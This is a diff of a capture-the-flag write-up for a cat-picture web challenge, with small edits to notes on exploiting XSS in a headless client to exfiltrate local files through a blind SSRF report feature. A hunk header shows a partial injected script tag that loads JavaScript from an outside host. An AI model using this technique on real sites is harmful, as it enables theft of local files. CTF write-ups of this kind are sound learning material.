@@ -8,7 +8,7 @@
 
 #### Tried:
 
- > Had A look, Thought of Exploiting XSS in headless client for local file exfiltration through Blind SSRF in report feature but thought of CORS blocking and did not go further to explore. This should have given clear hint to find XSS somehow :/ .  But did not try further, missed subtle hints around the CAT pic loading feature, good point to note, Good CTF don't give some features just for the sake of story.
+ > Had A look, Thought of Exploiting XSS in headless client for local file exfiltration through Blind SSRF in report feature but thought of CORS blocking and did not go further to explore. This should have given clear hint to find XSS somehow :/ . Plus to find the location of flag, should have fuzzed around But did not try further, missed subtle hints around the CAT pic loading feature, good point to note, Good CTF don't give some features just for the sake of story.
 
 #### Solutions:
 
@@ -40,7 +40,7 @@ http://catweb.zajebistyc.tf/?+urlencode(","content": ["\"><script src='https://c
 
 But our JS wont work as CORS would block our evil JS's request to file:// as the origins dont match at all.
 
-But file://app/template.index.html === http://cat.com/ in the context of Blind SSRF victim.
+But file://app/template/index.html === http://cat.com/ in the context of Blind SSRF victim.
 
 Hence Final Payload: 
 
